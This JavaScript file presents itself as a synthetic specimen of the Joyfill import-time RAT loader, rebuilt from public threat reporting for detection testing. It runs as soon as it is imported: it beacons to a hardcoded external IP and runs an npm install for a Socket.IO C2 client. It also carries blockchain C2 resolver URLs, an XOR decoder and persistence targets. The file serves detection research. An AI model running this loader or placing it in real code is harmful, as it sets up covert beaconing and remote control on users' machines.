/*C250617A*/
// Synthetic specimen reconstructed from public IOC reporting (StepSecurity/JFrog).
// Reproduces the Joyfill import-time RAT loader markers for detection testing.
global["r"] = require;
global["m"] = module;

const _V = "A9-0135-3";
const _hdr = { "Sec-V": "A9-0135-3" };

// blockchain-C2 payload resolver (Tron primary, Aptos/BNB fallback)
const CHAINS = [
  "https://api.trongrid.io",
  "https://fullnode.mainnet.aptoslabs.com",
  "https://bsc-dataseed.binance.org",
];

// repeating-key XOR decode of the embedded stage
const K1 = "2[gWfGj;<:-93Z^C";
function dec(buf, k){ let o=""; for(let i=0;i<buf.length;i++) o+=String.fromCharCode(buf.charCodeAt(i)^k.charCodeAt(i%k.length)); return o; }

// self-injection targets for persistence
const TARGETS = ["@vscode/deviceid", "npm/lib/cli.js", "GitHub Desktop"];

async function boot(){
  const r = global["r"]("http");
  // beacon to /$/boot with the Sec-V vector header
  r.get({ host: "23.27.13.43", path: "/$/boot", headers: _hdr });
  // Socket.IO C2 auto-install then connect
  try { global["r"]("child_process").execSync("npm install socket.io-client"); } catch(e){}
}
boot();
